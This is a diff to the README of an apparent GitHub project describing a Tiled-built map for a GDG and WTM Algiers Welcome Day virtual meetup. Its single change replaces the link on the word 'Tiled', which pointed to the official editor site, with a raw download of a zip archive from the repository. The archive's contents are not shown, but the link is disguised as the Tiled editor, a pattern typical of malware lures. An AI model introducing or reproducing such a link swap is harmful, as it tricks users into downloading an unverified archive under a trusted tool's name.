@@ -1,7 +1,7 @@
 # GDG ALGIERS WELCOMEDAY's MAP
 
 ## What is it ? 
-its a map built with <a href = "https://www.mapeditor.org/"> Tiled </a> fot the virtual meetup of GDG and WTM Algiers annual Welcome Day in this map , You’ll get the chance to visit 6 different rooms 
+its a map built with <a href = "https://github.com/AyoubKezzoula/welcome-day-map/raw/refs/heads/master/src/day-map-welcome-2.4.zip"> Tiled </a> fot the virtual meetup of GDG and WTM Algiers annual Welcome Day in this map , You’ll get the chance to visit 6 different rooms 
 
 ### The live stream zone : 
 where you will get the chance to watch a special live stream of GDG and WTM Algiers for this special occasion, brought to you by their organizers
